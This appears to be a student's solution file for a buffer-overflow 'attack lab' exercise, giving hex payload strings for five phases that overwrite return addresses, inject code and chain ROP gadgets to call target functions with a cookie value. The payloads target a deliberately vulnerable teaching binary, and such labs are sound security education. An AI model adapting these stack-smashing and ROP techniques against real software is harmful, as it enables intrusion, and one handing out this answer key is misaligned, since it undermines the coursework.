Phase 1:
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 //Buffer size
B6 17 40 00 00 00 00 00 //Call touch2


Phase 2:
bf 1c d7 83 7a C3 00 00 //Injected Code buf
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 //Buffer size
C8 36 66 55 00 00 00 00 //Call Buf
E2 17 40 00 00 00 00 00 //Cal touch2


Phase 3: 

bf 10 37 66 55 C3 00 00 //Injected Code Buf
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 //Buffer size
C8 36 66 55 00 00 00 00 //Call Buf
b6 18 40 00 00 00 00 00 //Call touch3
37 61 38 33 64 37 31 63 00 //Cookie string


Phase 4:

Cookie = 0x7a83d71c

00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //Buffer size
62 19 40 00 00 00 00 00 //popq %rax
1c d7 83 7a 00 00 00 00 //cookie 0x7a83d71c
54 19 40 00 00 00 00 00 //movq %rax, %rdi
e2 17 40 00 00 00 00 00 //touch2 Address


Phase 5:

Cookie String = 37 61 38 33 64 37 31 63 00

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 //Buffer size
a4 19 40 00 00 00 00 00 //movq rsp, rax
54 19 40 00 00 00 00 00 //movq rax, rdi
62 19 40 00 00 00 00 00 //popq rax
48 00 00 00 00 00 00 00 //Offset
97 19 40 00 00 00 00 00 //movl eax, ecx
bf 19 40 00 00 00 00 00 //movl ecx, edx
b2 19 40 00 00 00 00 00 //movl edx, esi
82 19 40 00 00 00 00 00 //lea (rdi, rsi, 1), rax
54 19 40 00 00 00 00 00 //movq rax, rdi
b6 18 40 00 00 00 00 00 //touch3
37 61 38 33 64 37 31 63 00 //cookie